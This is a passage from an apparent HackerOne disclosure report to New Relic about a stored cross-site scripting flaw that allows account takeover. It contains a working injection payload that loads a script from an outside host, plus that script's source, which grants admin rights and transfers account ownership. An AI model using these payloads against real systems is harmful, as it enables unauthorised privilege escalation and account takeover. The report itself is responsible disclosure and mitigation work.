src=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/294/526/3ef66a7e7d123986d5f9216e91c5f823f00c2494/2018-05-07-000955_485x109_scrot.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQWS2CSUE3%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T221856Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA4aDNFtI3gdfN0FFddCnSK3A%2FNn8rGoRLECenibnPQxlYfOkhD533uSo6Jsi4CGisj6U81IFoE7NBEuPv%2BUT2dP%2BOOfq6zDsTXqsfa%2B9BuuRNIyl27dmo7gw2zBlEjVTSMZKI8B0zj4q4GeD0gX7YDUvrqCnrwfrQpq6BHV5kFcBvzP%2FNnVou4jydvq2EcrKGQeGmq4afFHwdD5CN5DoFnFHkXlCLPVWCK%2FpO5NMVMdWRvVyk90BTGTkyTY5IWuz0%2B08qqd5UcN1WLfvK4E3S6jTn5eK%2FSX5o5meFKi0SmtPddLVR5u8xNOgccHPaVXRO5KIBBCZ5yilpXGFhVd%2FmfBeI1lJ6Zc7kOal7ihq3TcrVPP%2FopjPjQdAVdt9an7SXkRFGjCeWjyWfPwghBaIoGvWhM9OHPkS94WN%2FukqeEoK1pVo2cJuAYnallyv%2Fvqjndvr%2BodZqbfFrY5T9ebirMMIoriCBo2Xkpz9lw7EjTK4aWQBSBYrDh4Xl4%2FXmR8N0VkEu6LxpbUd0lfl%2Fjh1nqnK2KhGRbixj81Rq6v9WRwhjH%2FADPcK25w6aq3rFp1RLV%2B6mj273p2%2FLR6yf68LZuCXsY5sDs2Xf0oo46m4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=e95ac22968a1b560a7464d25cb29fc3786d89c794e4e3d8e57b613d25ccfa861\" class=\"markdown-inline-image\"></a></p></li>\n</ol>\n\n<h1 id=\"leveraging-this-to-elevate-our-own-privileges\">Leveraging this to elevate our own privileges</h1>\n\n<p>I used the <code>account.newrelic.com</code> REST API to build an attack scenario where an unprivileged user could elevate their own privileges to the status of <code>owner</code>. It&#39;s a two step job, first we need to grant ourself the <code>admin</code> privileges, and then we need to make the owner transfer ownership to our account.</p>\n\n<h3 id=\"bypassing-character-limitation\">Bypassing character limitation</h3>\n\n<p>The application <code>Name</code> field is restricted to 128 characters, which is too short for a working two-step payload (admin-granting and owner-transferring). I side-loaded a self-hosted Javascript file through jQuery in order to save space. This is the payload I used:</p>\n<pre class=\"highlight javascript\"><code><span class=\"s1\">&#39;+$.ajax({url:&quot;https://windows-analytics.com/j.js&quot;,dataType:&quot;script&quot;})+&#39;</span>\n</code></pre>\n<p>The <code>j.js</code> file is fetched by jQuery and interpreted in the context of the DOM at <code>rpm.newrelic.com</code>. This is the content of the file:</p>\n<pre class=\"highlight javascript\"><code><span class=\"kd\">var</span> <span class=\"nx\">ADMIN_USER_ID</span>    <span class=\"o\">=</span> <span class=\"mi\">2194406</span><span class=\"p\">;</span>\n<span class=\"kd\">var</span> <span class=\"nx\">ATTACKER_USER_ID</span> <span class=\"o\">=</span> <span class=\"mi\">2196014</span><span class=\"p\">;</span>\n\n<span class=\"c1\">// step 1, admin takeover</span>\n<span class=\"nx\">alert</span><span class=\"p\">(</span><span class=\"s2\">&quot;Giving us admin privileges...&quot;</span><span class=\"p\">);</span>\n<span class=\"nx\">$</span><span class=\"p\">.</span><span class=\"nx\">ajax</span><span class=\"p\">({</span>\n    <span class=\"na\">url</span><span class=\"p\">:</span> <span class=\"s2\">&quot;/user_management/accounts/1968666/users/&quot;</span><span class=\"o\">+</span><span class=\"nx\">ATTACKER_USER_ID</span><span class=\"p\">,</span>\n    <span class=\"na\">type</span><span class=\"p\">:</span> <span class=\"s2\">&quot;put&quot;</span><span class=\"p\">,</span>\n    <span class=\"na\">data</span><span class=\"p\">:</span> <span class=\"nx\">JSON</span><span class=\"p\">.</span><span class=\"nx\">stringify</span><span class=\"p\">({</span><span class=\"s2\">&quot;account_view&quot;</span><span class=\"p\">:{</span><span class=\"s2\">&quot;level&quot;</span><span class=\"p\">:</span><span class=\"s2\">&quot;admin&quot;</span><span class=\"p\">}}),</span>\n    <span class=\"na\">headers</span><span class=\"p\">:</span> <span class=\"p\">{</span>\n    <span class=\"s2\">&quot;Origin&quot;</span><span class=\"p\">:</span><span class=\"s2\">&quot;https://account.newrelic.com&quot;</span><span class=\"p\">,</span>\n    <span class=\"s2\">&quot;Accept&quot;</span><span class=\"p\">:</span><span class=\"s2\">&quot;application/json&quot;</span><span class=\"p\">,</span>\n    <span class=\"s2\">&quot;X-Requested-With&quot;</span><span class=\"p\">:</span><span class=\"s2\">&quot;XMLHttpRequest&quot;</span><span class=\"p\">,</span>\n    <span class=\"s2\">&quot;User-Agent&quot;</span><span class=\"p\">:</span><span class=\"s2\">&quot;Mozilla/5.0 (X11; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0&quot;</span><span class=\"p\">,</span>\n    <span class=\"s2\">&quot;Connection&quot;</span><span class=\"p\">:</span><span class=\"s2\">&quot;close&quot;</span><span class=\"p\">,</span>\n    <span class=\"s2\">&quot;Accept-Language&quot;</span><span class=\"p\">:</span><span class=\"s2\">&quot;en-US,en;q=0.5&quot;</span><span class=\"p\">,</span>\n    <span class=\"s2\">&quot;Accept-Encoding&quot;</span><span class=\"p\">:</span><span class=\"s2\">&quot;gzip, deflate&quot;</span><span class=\"p\">,</span>\n    <span class=\"s2\">&quot;Content-Type&quot;</span><span class=\"p\">:</span><span class=\"s2\">&quot;application/json&quot;</span>\n    <span class=\"p\">},</span>\n    <span class=\"na\">success</span><span class=\"p\">:</span> <span class=\"kd\">function</span> <span class=\"p\">(</span><span class=\"nx\">data</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n    <span class=\"c1\">// step 2, ownership takeover</span>\n    <span class=\"nx\">alert</span><span class=\"p\">(</span><span class=\"s2\">&quot;Changing ownership...&quot;</span><span class=\"p\">);</span>\n    <span class=\"nx\">$</span><span class=\"p\">.</span><span class=\"nx\">ajax</span><span class=\"p\">({</span>\n        <span class=\"na\">url</span><span class=\"p\">:</span> <span class=\"s2\">&quot;/user_management/accounts/1968666/update_primary_admin?value=&quot;</span><span class=\"o\">+</span><span class=\"nx\">ATTACKER_USER_ID</span><span class=\"p\">,</span>\n        <span class=\"na\">type</span><span class=\"p\">:</span> <span class=\"s2\">&quot;put&quot;</span><span class=\"p\">,</span>\n        <span class=\"na\">headers</span><span class=\"p\">:</span> <span class=\"p\">{</span>\n        <span class=\"s2\">&quot;Origin&quot;</span><span class=\"p\">:</span><span class=\"s2\">&quot;https://account.newrelic.com&quot;</span><span class=\"p\">,</span>\n        <span class=\"s2\">&quot;Accept&quot;</span><span class=\"p\">:</span><span class=\"s2\">&quot;*/*&quot;</span><span class=\"p\">,</span>\n        <span class=\"s2\">&quot;X-Requested-With&quot;</span><span class=\"p\">:</span><span class=\"s2\">&quot;XMLHttpRequest&quot;</span><span class=\"p\">,</span>\n        <span class=\"s2\">&quot;User-Agent&quot;</span><span class=\"p\">:</span><span class=\"s2\">&quot;Mozilla/5.0 (X11; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0&quot;</span><span class=\"p\">,</span>\n        <span class=\"s2\">&quot;Connection&quot;</span><span class=\"p\">:</span><span class=\"s2\">&quot;close&quot;</span><span class=\"p\">,</span>\n        <span class=\"s2\">&quot;Accept-Language&quot;</span><span class=\"p\">:</span><span class=\"s2\">&quot;en-US,en;q=0.5&quot;</span><span class=\"p\">,</span>\n        <span class=\"s2\">&quot;Accept-Encoding&quot;</span><span class=\"p\">:</span><span class=\"s2\">&quot;gzip, deflate&quot;</span>\n        <span class=\"p\">},</span>\n        <span class=\"na\">success</span><span class=\"p\">:</span> <span class=\"kd\">function</span> <span class=\"p\">()</span> <span class=\"p\">{</span>\n        <span class=\"c1\">// Account takeover done!</span>\n        <span class=\"nx\">alert</span><span class=\"p\">(</span><span class=\"s2\">&quot;Full takeover done!&quot;</span><span class=\"p\">);</span>\n        <span class=\"p\">}</span>\n    <span class=\"p\">});</span>\n    <span class=\"p\">}</span>\n<span class=\"p\">});</span>\n</code></pre>\n<p>This file performs two AJAX queries when loaded. First, it grants the attacker&#39;s account the <code>admin</code> privileges. Second, it transfers the ownership of the victim&#39;s account to the attacker&#39;s. I leaked the <code>user_id</code> of the account owner through the <code>user-management.service.newrelic.com</code> API at the <code>/accounts/1968666/users</code> endpoint. I put this value in the beginning of the <code>j.js</code>. </p>\n\n<h2 id=\"triggering-the-payload\">Triggering the payload</h2>\n\n<p>Once an admin visits either the <code>https://rpm.newrelic.com/accounts/{ACCOUNT_ID}browser/{APP_ID}/alert_conditions</code> or <code>https://rpm.newrelic.com/accounts/{ACCOUNT_ID}/browser/{APP_ID}/violations</code>, this chain of actions will unfold and the administrator will have transferred the ownership of the account over to the attacker.</p>\n\n<p>A full video of the attack scenario can be seen here: <a href=\"#\" class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"output.gif\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/294/527/8b2e85bf825334637a8d2df115dea36f2628bce7/output.gif?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQWS2CSUE3%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T221856Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA4aDNFtI3gdfN0FFddCnSK3A%2FNn8rGoRLECenibnPQxlYfOkhD533uSo6Jsi4CGisj6U81IFoE7NBEuPv%2BUT2dP%2BOOfq6zDsTXqsfa%2B9BuuRNIyl27dmo7gw2zBlEjVTSMZKI8B0zj4q4GeD0gX7YDUvrqCnrwfrQpq6BHV5kFcBvzP%2FNnVou4jydvq2EcrKGQeGmq4afFHwdD5CN5DoFnFHkXlCLPVWCK%2FpO5NMVMdWRvVyk90BTGTkyTY5IWuz0%2B08qqd5UcN1WLfvK4E3S6jTn5eK%2FSX5o5meFKi0SmtPddLVR5u8xNOgccHPaVXRO5KIBBCZ5yilpXGFhVd%2FmfBeI1lJ6Zc7kOal7ihq3TcrVPP%2FopjPjQdAVdt9an7SXkRFGjCeWjyWfPwghBaIoGvWhM9OHPkS94WN%2FukqeEoK1pVo2cJuAYnallyv%2Fvqjndvr%2BodZqbfFrY5T9ebirMMIoriCBo2Xkpz9lw7EjTK4aWQBSBYrDh4Xl4%2FXmR8N0VkEu6LxpbUd0lfl%2Fjh1nqnK2KhGRbixj81Rq6v9WRwhjH%2FADPcK25w6aq3rFp1RLV%2B6mj273p2%2FLR6yf68LZuCXsY5sDs2Xf0oo46m4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=baad9a1160242288a4243a5f1716f4fcbca0f40e45a06ec2eaa1ff5babdc22f1\" data-attachment-type=\"image/gif\"><img src=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/294/527/8b2e85bf825334637a8d2df115dea36f2628bce7/output.gif?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQWS2CSUE3%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T221856Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA4aDNFtI3gdfN0FFddCnSK3A%2FNn8rGoRLECenibnPQxlYfOkhD533uSo6Jsi4CGisj6U81IFoE7NBEuPv%2BUT2dP%2BOOfq6zDsTXqsfa%2B9BuuRNIyl27dmo7gw2zBlEjVTSMZKI8B0zj4q4GeD0gX7YDUvrqCnrwfrQpq6BHV5kFcBvzP%2FNnVou4jydvq2EcrKGQeGmq4afFHwdD5CN5DoFnFHkXlCLPVWCK%2FpO5NMVMdWRvVyk90BTGTkyTY5IWuz0%2B08qqd5UcN1WLfvK4E3S6jTn5eK%2FSX5o5meFKi0SmtPddLVR5u8xNOgccHPaVXRO5KIBBCZ5yilpXGFhVd%2FmfBeI1lJ6Zc7kOal7ihq3TcrVPP%2FopjPjQdAVdt9an7SXkRFGjCeWjyWfPwghBaIoGvWhM9OHPkS94WN%2FukqeEoK1pVo2cJuAYnallyv%2Fvqjndvr%2BodZqbfFrY5T9ebirMMIoriCBo2Xkpz9lw7EjTK4aWQBSBYrDh4Xl4%2FXmR8N0VkEu6LxpbUd0lfl%2Fjh1nqnK2KhGRbixj81Rq6v9WRwhjH%2FADPcK25w6aq3rFp1RLV%2B6mj273p2%2FLR6yf68LZuCXsY5sDs2Xf0oo46m4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=baad9a1160242288a4243a5f1716f4fcbca0f40e45a06ec2eaa1ff5babdc22f1\" class=\"markdown-inline-image\"></a></p>\n\n<h1 id=\"mitigation\">Mitigation</h1>\n\n<p>First, the <code>Name</code> field should be properly sanitized to block users from executing arbitrary JavaScript.<br>\nSecond, (and I feel this could be a bug report of its own) critical actions such as transferring ownership, granting high privileges, <em>should require re-entering your administrative password</em>. This is a standard practice when following defence in depth principles. Using this principle, XSS attacks would be restricted to a very limited set of actions, none of which should have critical impact.</p>\n\n<h2 id=\"impact\">Impact</h2>\n\n<p>Users can execute arbitrary JavaScript code in the context of other users. This is critical when targeted users have high privileges. Attackers are then able to grant themselves the administrator privileges and even takeover the ownership of the New Relic account.</p>\n\n<p>The hacker selected the <strong>Cross-site Scripting (XSS) - Stored</strong> weakness. This vulnerability type requires contextual information from the hacker. They provided the following answers:</p>\n\n<p><strong>URL</strong><br>\n<a title=\"https://rpm.newrelic.com/accounts/1968666/browser/52924826/alert_conditions\" href=\"/redirect?signature=63c95c3b8212a7cdaa414280e81da961325aa829&amp;url=https%3A%2F%2Frpm.newrelic.com%2Faccounts%2F1968666%2Fbrowser%2F52924826%2Falert_conditions\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://rpm.newrelic.com/accounts/1968666/browser/52924826/alert_conditions</span><i class=\"icon-external-link\"></i></a></p>\n\n<p><strong>Verified</strong><br>\nYes</p>\n", 
    "severity_rating": "high", 
    "team_private?": false, 
    "team": {
        "profile": {
            "website": "https://newrelic.com", 
            "about": "New Relic's Coordinated Disclosure Program", 
            "twitter_handle": "newrelic", 
            "name": "New Relic"
        }, 
        "handle": "newrelic", 
        "url": "https://hackerone.com/newrelic", 
        "state": "public_mode", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/017/011/4a259e2f731f105c784b1279db99215cefb8abbd_small.?1482361910", 
            "medium": "https://profile-photos.hackerone-user-content.com/000/017/011/94822999c270d791d185b40e07d36cc864e96faa_medium.?1482361910"
        }, 
        "awards_miles": false, 
        "permissions": [], 
        "id": 17011, 
        "default_currency": "usd"
    }, 
    "is_published": false
}